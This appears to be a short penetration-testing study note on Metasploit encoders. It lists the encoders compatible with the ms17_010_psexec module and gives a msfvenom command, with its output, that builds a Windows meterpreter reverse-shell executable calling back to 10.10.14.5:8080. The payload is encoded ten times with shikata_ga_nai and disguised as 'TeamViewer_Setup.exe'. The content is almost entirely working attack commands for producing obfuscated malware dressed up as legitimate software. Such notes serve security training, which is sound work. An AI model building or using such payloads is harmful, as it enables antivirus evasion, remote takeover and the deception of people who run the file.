# Encoders

## Encoder Selection

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > show encoders
```

```output title="Output"
Compatible Encoders
===================

   #   Name                                  Disclosure Date  Rank       Check  Description
   -   ----                                  ---------------  ----       -----  -----------
   0   encoder/x64/xor                       .                normal     No     XOR Encoder
   1   encoder/x64/xor_dynamic               .                normal     No     Dynamic key XOR Encoder
   2   encoder/x64/zutto_dekiru              .                manual     No     Zutto Dekiru
   3   encoder/x86/add_sub                   .                manual     No     Add/Sub Encoder
   4   encoder/x86/alpha_mixed               .                low        No     Alpha2 Alphanumeric Mixedcase Encoder
   5   encoder/x86/alpha_upper               .                low        No     Alpha2 Alphanumeric Uppercase Encoder
   6   encoder/x86/avoid_underscore_tolower  .                manual     No     Avoid underscore/tolower
   7   encoder/x86/avoid_utf8_tolower        .                manual     No     Avoid UTF8/tolower
   8   encoder/x86/bloxor                    .                manual     No     BloXor - A Metamorphic Block Based XOR Encoder
   9   encoder/x86/bmp_polyglot              .                manual     No     BMP Polyglot
   10  encoder/x86/call4_dword_xor           .                normal     No     Call+4 Dword XOR Encoder
   11  encoder/x86/context_cpuid             .                manual     No     CPUID-based Context Keyed Payload Encoder
   12  encoder/x86/context_stat              .                manual     No     stat(2)-based Context Keyed Payload Encoder
   13  encoder/x86/context_time              .                manual     No     time(2)-based Context Keyed Payload Encoder
   14  encoder/x86/countdown                 .                normal     No     Single-byte XOR Countdown Encoder
   15  encoder/x86/fnstenv_mov               .                normal     No     Variable-length Fnstenv/mov Dword XOR Encoder
   16  encoder/x86/jmp_call_additive         .                normal     No     Jump/Call XOR Additive Feedback Encoder
   17  encoder/x86/nonalpha                  .                low        No     Non-Alpha Encoder
   18  encoder/x86/nonupper                  .                low        No     Non-Upper Encoder
   19  encoder/x86/opt_sub                   .                manual     No     Sub Encoder (optimised)
   20  encoder/x86/service                   .                manual     No     Register Service
   21  encoder/x86/shikata_ga_nai            .                excellent  No     Polymorphic XOR Additive Feedback Encoder
   22  encoder/x86/single_static_bit         .                manual     No     Single Static Bit
   23  encoder/x86/unicode_mixed             .                manual     No     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   24  encoder/x86/unicode_upper             .                manual     No     Alpha2 Alphanumeric Unicode Uppercase Encoder
   25  encoder/x86/xor_dynamic               .                normal     No     Dynamic key XOR Encoder
   26  encoder/x86/xor_poly                  .                normal     No     XOR POLY Encoder
```

## [Shikata Ga Nai](https://en.wikipedia.org/wiki/Shikata_ga_nai) Encoder

```sh
my@attack:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -f exe --platform windows -a x86 -e x86/shikata_ga_nai -i 10 -o TeamViewer_Setup.exe
```

```output title="Output"
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewer_Setup.exe
```
